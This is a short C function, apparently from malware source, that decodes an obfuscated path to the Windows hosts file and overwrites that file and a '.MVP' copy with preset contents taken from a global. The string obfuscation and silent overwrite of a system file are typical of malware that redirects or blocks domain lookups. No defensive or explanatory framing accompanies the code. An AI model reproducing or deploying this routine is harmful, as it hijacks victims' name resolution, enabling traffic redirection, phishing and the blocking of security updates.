#include "data_globals.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

uint32_t _HOSTSFile(void)
{
    char system_directory[256];
    char hosts_file_path[298];
    char hosts_backup_path[298];
    FILE *hosts_file, *temp_hosts_file;

    GetSystemDirectoryA(system_directory, sizeof(system_directory));

    // Decrypt "\\drivers\\etc\\hosts"
    memset(hosts_file_path, 0, sizeof(hosts_file_path));
    _CiphStr(hosts_file_path, "\\qeviref\\rgp\\UBFGF");
    strcat(system_directory, hosts_file_path);

    strcpy(hosts_backup_path, system_directory);
    strcat(hosts_backup_path, ".MVP");

    hosts_file = fopen(system_directory, "wb");
    temp_hosts_file = fopen(hosts_backup_path, "wb");

    fputs(HOSTS_f, hosts_file);
    fputs(HOSTS_f, temp_hosts_file);

    fclose(hosts_file);
    fclose(temp_hosts_file);

    return 0;
}
